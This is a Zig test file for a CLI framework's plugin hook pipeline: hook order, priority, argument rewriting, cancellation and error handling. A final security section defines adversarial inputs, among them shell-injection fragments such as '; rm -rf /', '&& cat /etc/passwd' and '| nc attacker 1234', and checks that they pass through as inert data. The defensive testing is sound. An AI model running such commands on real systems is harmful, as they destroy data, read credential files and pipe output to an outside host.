//! Behavioral tests for the plugin pipeline — the hook machinery the registry
//! runs around every command. This rebuilds the coverage lost when the
//! pre-monorepo plugin_*_test.zig files were dropped (they targeted the old
//! *zcli.Context / setGlobalData API), rewritten against the current
//! type-safe `context: anytype` plugin model.
//!
//! What the registry does per invocation (see registry.zig `execute`):
//!   1. preParse(ctx, args)            -> rewrite raw argv
//!   2. handleGlobalOption(ctx, n, v)  -> per matched global option
//!   3. transformArgs(ctx, args)       -> rewrite/halt before routing
//!   4. postParse(ctx, parsed)         -> rewrite parsed args
//!   5. preExecute(ctx, parsed)        -> rewrite, or cancel (return null)
//!   6. <command>.execute(...)         -> onError(ctx, err) on failure
//!   7. postExecute(ctx, success)
//! Plugins run highest-`priority` first.

const std = @import("std");
const zcli = @import("zcli");
const testing = std.testing;

// ---------------------------------------------------------------------------
// Test harness
// ---------------------------------------------------------------------------

/// Ordered record of pipeline events for a single run, so tests can assert both
/// "did this hook fire" and "in what order".
const Trace = struct {
    var events: [64][]const u8 = undefined;
    var len: usize = 0;

    fn reset() void {
        len = 0;
    }
    fn record(name: []const u8) void {
        if (len < events.len) {
            events[len] = name;
            len += 1;
        }
    }
    fn items() []const []const u8 {
        return events[0..len];
    }
    fn expectOrder(expected: []const []const u8) !void {
        const got = items();
        try testing.expectEqual(expected.len, got.len);
        for (expected, got) |e, g| try testing.expectEqualStrings(e, g);
    }
};

fn run(comptime App: type, argv: []const []const u8) !void {
    var app = App.init();
    // Empty environment; mirrors registry.zig's own tests (no deinit needed).
    const environ = std.process.Environ.Map.init(testing.allocator);
    try app.execute(testing.allocator, std.testing.io, &environ, argv);
}

const test_config = zcli.Config{
    .app_name = "test",
    .app_version = "1.0.0",
    .app_description = "Pipeline test CLI",
};

// ---------------------------------------------------------------------------
// Test commands
// ---------------------------------------------------------------------------

const Greet = struct {
    var executed = false;
    pub const meta = .{ .description = "greet" };
    pub const Args = zcli.NoArgs;
    pub const Options = zcli.NoOptions;
    pub fn execute(_: Args, _: Options, _: anytype) !void {
        executed = true;
    }
};

const Checkout = struct {
    var executed = false;
    pub const meta = .{ .description = "checkout" };
    pub const Args = zcli.NoArgs;
    pub const Options = zcli.NoOptions;
    pub fn execute(_: Args, _: Options, _: anytype) !void {
        executed = true;
    }
};

const Echo = struct {
    var last: []const u8 = "";
    pub const meta = .{ .description = "echo" };
    pub const Args = struct { word: []const u8 };
    pub const Options = zcli.NoOptions;
    pub fn execute(args: Args, _: Options, _: anytype) !void {
        last = args.word;
    }
};

const Fail = struct {
    pub const meta = .{ .description = "fail" };
    pub const Args = zcli.NoArgs;
    pub const Options = zcli.NoOptions;
    pub fn execute(_: Args, _: Options, _: anytype) !void {
        return error.Boom;
    }
};

// ---------------------------------------------------------------------------
// 1. Every hook fires, in the documented order
// ---------------------------------------------------------------------------

const FullHookPlugin = struct {
    pub const global_options = [_]zcli.GlobalOption{
        zcli.option("trace", bool, .{ .default = false, .description = "" }),
    };
    pub fn preParse(_: anytype, args: []const []const u8) ![]const []const u8 {
        Trace.record("preParse");
        return args;
    }
    pub fn handleGlobalOption(_: anytype, name: []const u8, value: anytype) !void {
        _ = name;
        _ = value;
        Trace.record("handleGlobalOption");
    }
    pub fn transformArgs(_: anytype, args: []const []const u8) !zcli.TransformResult {
        Trace.record("transformArgs");
        return .{ .args = args };
    }
    pub fn postParse(_: anytype, parsed: zcli.ParsedArgs) !?zcli.ParsedArgs {
        Trace.record("postParse");
        return parsed;
    }
    pub fn preExecute(_: anytype, parsed: zcli.ParsedArgs) !?zcli.ParsedArgs {
        Trace.record("preExecute");
        return parsed;
    }
    pub fn postExecute(_: anytype, success: bool) !void {
        _ = success;
        Trace.record("postExecute");
    }
    pub fn onError(_: anytype, _: anyerror) !bool {
        Trace.record("onError");
        return false;
    }
};

test "pipeline: all hooks fire in order for a successful command" {
    const App = zcli.Registry.init(test_config)
        .register("greet", Greet)
        .registerPlugin(FullHookPlugin)
        .build();

    Trace.reset();
    Greet.executed = false;
    try run(App, &.{ "--trace", "greet" });

    try testing.expect(Greet.executed);
    // onError must NOT appear — the command succeeded.
    try Trace.expectOrder(&.{
        "preParse",
        "handleGlobalOption",
        "transformArgs",
        "postParse",
        "preExecute",
        "postExecute",
    });
}

// ---------------------------------------------------------------------------
// 2. Multiple plugins run highest-priority first
// ---------------------------------------------------------------------------

fn OrderPlugin(comptime tag: []const u8, comptime prio: i32) type {
    return struct {
        pub const priority = prio;
        pub fn preExecute(_: anytype, parsed: zcli.ParsedArgs) !?zcli.ParsedArgs {
            Trace.record(tag);
            return parsed;
        }
    };
}

test "pipeline: plugins are invoked in descending priority order" {
    const App = zcli.Registry.init(test_config)
        .register("greet", Greet)
        .registerPlugin(OrderPlugin("low", 1))
        .registerPlugin(OrderPlugin("high", 100))
        .build();

    Trace.reset();
    try run(App, &.{"greet"});

    // Registration order is low-then-high, but priority must reorder them.
    try Trace.expectOrder(&.{ "high", "low" });
}

// ---------------------------------------------------------------------------
// 3. preParse rewrites argv before routing
// ---------------------------------------------------------------------------

const AliasPlugin = struct {
    pub fn preParse(_: anytype, args: []const []const u8) ![]const []const u8 {
        // Expand the alias "co" -> "checkout" (static slice; no allocation).
        if (args.len == 1 and std.mem.eql(u8, args[0], "co")) {
            return &.{"checkout"};
        }
        return args;
    }
};

test "pipeline: preParse can rewrite argv and change which command runs" {
    const App = zcli.Registry.init(test_config)
        .register("checkout", Checkout)
        .registerPlugin(AliasPlugin)
        .build();

    Checkout.executed = false;
    try run(App, &.{"co"});
    try testing.expect(Checkout.executed);
}

// ---------------------------------------------------------------------------
// 4. transformArgs can halt the pipeline before the command runs
// ---------------------------------------------------------------------------

const HaltPlugin = struct {
    pub fn transformArgs(_: anytype, args: []const []const u8) !zcli.TransformResult {
        return .{ .args = args, .continue_processing = false };
    }
};

test "pipeline: transformArgs halt prevents command execution" {
    const App = zcli.Registry.init(test_config)
        .register("greet", Greet)
        .registerPlugin(HaltPlugin)
        .build();

    Greet.executed = false;
    try run(App, &.{"greet"}); // no error: halting is a clean stop
    try testing.expect(!Greet.executed);
}

// ---------------------------------------------------------------------------
// 5. preExecute returning null cancels execution
// ---------------------------------------------------------------------------

const CancelPlugin = struct {
    pub fn preExecute(_: anytype, parsed: zcli.ParsedArgs) !?zcli.ParsedArgs {
        _ = parsed;
        return null; // cancel
    }
};

test "pipeline: preExecute returning null cancels the command" {
    const App = zcli.Registry.init(test_config)
        .register("greet", Greet)
        .registerPlugin(CancelPlugin)
        .build();

    Greet.executed = false;
    try run(App, &.{"greet"});
    try testing.expect(!Greet.executed);
}

// ---------------------------------------------------------------------------
// 6. Global options are parsed and dispatched with the right typed value
// ---------------------------------------------------------------------------

const GlobalOptPlugin = struct {
    var verbose_seen: ?bool = null;
    var level_seen: ?[]const u8 = null;

    pub const global_options = [_]zcli.GlobalOption{
        zcli.option("verbose", bool, .{ .short = 'v', .default = false, .description = "" }),
        zcli.option("level", []const u8, .{ .default = "info", .description = "" }),
    };
    pub fn handleGlobalOption(_: anytype, name: []const u8, value: anytype) !void {
        if (std.mem.eql(u8, name, "verbose")) {
            if (@TypeOf(value) == bool) verbose_seen = value;
        } else if (std.mem.eql(u8, name, "level")) {
            if (@TypeOf(value) == []const u8) level_seen = value;
        }
    }
};

test "pipeline: handleGlobalOption receives correctly typed values" {
    const App = zcli.Registry.init(test_config)
        .register("greet", Greet)
        .registerPlugin(GlobalOptPlugin)
        .build();

    GlobalOptPlugin.verbose_seen = null;
    GlobalOptPlugin.level_seen = null;
    try run(App, &.{ "--verbose", "--level", "debug", "greet" });

    try testing.expectEqual(@as(?bool, true), GlobalOptPlugin.verbose_seen);
    try testing.expect(GlobalOptPlugin.level_seen != null);
    try testing.expectEqualStrings("debug", GlobalOptPlugin.level_seen.?);
}

// ---------------------------------------------------------------------------
// 7. postParse can replace the parsed args the command sees
// ---------------------------------------------------------------------------

const InjectPlugin = struct {
    pub fn postParse(_: anytype, parsed: zcli.ParsedArgs) !?zcli.ParsedArgs {
        _ = parsed;
        return .{ .positional = &.{"injected"} };
    }
};

test "pipeline: postParse can rewrite the args the command receives" {
    const App = zcli.Registry.init(test_config)
        .register("echo", Echo)
        .registerPlugin(InjectPlugin)
        .build();

    Echo.last = "";
    try run(App, &.{ "echo", "original" });
    try testing.expectEqualStrings("injected", Echo.last);
}

// ---------------------------------------------------------------------------
// 8. onError on a command failure: observed, but not suppressible
// ---------------------------------------------------------------------------

const ObserveErrPlugin = struct {
    var seen: ?anyerror = null;
    pub fn onError(_: anytype, err: anyerror) !bool {
        seen = err;
        return true; // claims to handle it...
    }
};

test "pipeline: onError observes a command failure but cannot suppress it" {
    const App = zcli.Registry.init(test_config)
        .register("fail", Fail)
        .registerPlugin(ObserveErrPlugin)
        .build();

    ObserveErrPlugin.seen = null;
    // A command-execution error always propagates, even when onError returns
    // true — onError on this path is observe-only (unlike CommandNotFound).
    try testing.expectError(error.Boom, run(App, &.{"fail"}));
    try testing.expectEqual(@as(?anyerror, error.Boom), ObserveErrPlugin.seen);
}

// ---------------------------------------------------------------------------
// 9. onError CAN suppress CommandNotFound (the help-plugin path)
// ---------------------------------------------------------------------------

const NotFoundPlugin = struct {
    var handled = false;
    pub fn onError(_: anytype, err: anyerror) !bool {
        if (err == error.CommandNotFound) {
            handled = true;
            return true;
        }
        return false;
    }
};

test "pipeline: onError returning true suppresses CommandNotFound" {
    const App = zcli.Registry.init(test_config)
        .register("greet", Greet)
        .registerPlugin(NotFoundPlugin)
        .build();

    NotFoundPlugin.handled = false;
    try run(App, &.{"does-not-exist"}); // unknown command -> handled, no error
    try testing.expect(NotFoundPlugin.handled);
}

// ---------------------------------------------------------------------------
// 10. postExecute is told whether the command succeeded
// ---------------------------------------------------------------------------

const PostExecPlugin = struct {
    var success_seen: ?bool = null;
    pub fn postExecute(_: anytype, success: bool) !void {
        success_seen = success;
    }
};

test "pipeline: postExecute receives success=true after a successful command" {
    const App = zcli.Registry.init(test_config)
        .register("greet", Greet)
        .registerPlugin(PostExecPlugin)
        .build();

    PostExecPlugin.success_seen = null;
    try run(App, &.{"greet"});
    try testing.expectEqual(@as(?bool, true), PostExecPlugin.success_seen);
}

// ---------------------------------------------------------------------------
// Pipeline robustness against adversarial input
//
// security_test.zig and fuzz_test.zig feed malicious input to the parsers in
// isolation. These push it through the *whole* `app.execute` pipeline — global
// option scanning, value consumption, routing — which has its own arg handling
// the parser-only tests never exercise. The contract: adversarial input is
// treated as inert data (never interpreted, never crashes the pipeline).
// ---------------------------------------------------------------------------

const adversarial_inputs = [_][]const u8{
    "$(whoami)",
    "`id`",
    "; rm -rf /",
    "&& cat /etc/passwd",
    "| nc attacker 1234",
    "%s%s%s%n", // format-string attack
    "../../../../etc/passwd",
    "\x00hidden", // embedded null byte
    "A" ** 4096, // oversized
};

test "pipeline security: adversarial command names route safely, never to a real command" {
    const App = zcli.Registry.init(test_config)
        .register("greet", Greet)
        .registerPlugin(NotFoundPlugin) // swallow CommandNotFound
        .build();

    for (adversarial_inputs) |bad| {
        Greet.executed = false;
        // Must not panic. An error is acceptable; a crash or misroute is not.
        run(App, &.{bad}) catch {};
        try testing.expect(!Greet.executed);
    }
}

test "pipeline security: global option values pass through verbatim (no interpretation)" {
    const App = zcli.Registry.init(test_config)
        .register("greet", Greet)
        .registerPlugin(GlobalOptPlugin)
        .build();

    for (adversarial_inputs) |bad| {
        GlobalOptPlugin.level_seen = null;
        // `--level <bad>`: the value is consumed and handed to the plugin as-is.
        try run(App, &.{ "--level", bad, "greet" });
        try testing.expect(GlobalOptPlugin.level_seen != null);
        try testing.expectEqualStrings(bad, GlobalOptPlugin.level_seen.?);
    }
}

test "pipeline security: command arguments reach the command verbatim" {
    const App = zcli.Registry.init(test_config)
        .register("echo", Echo)
        .build();

    for (adversarial_inputs) |bad| {
        Echo.last = "";
        // A parse error is fine (no crash); when it parses, it must be literal.
        run(App, &.{ "echo", bad }) catch continue;
        try testing.expectEqualStrings(bad, Echo.last);
    }
}

test "pipeline security: an oversized argument vector does not crash the pipeline" {
    const App = zcli.Registry.init(test_config)
        .register("echo", Echo)
        .build();

    var args = std.ArrayList([]const u8).empty;
    defer args.deinit(testing.allocator);
    try args.append(testing.allocator, "echo");
    for (0..5000) |_| try args.append(testing.allocator, "x");

    // Echo wants a single positional, so this errors — but it must not panic,
    // leak, or corrupt state while scanning thousands of args.
    run(App, args.items) catch {};
}
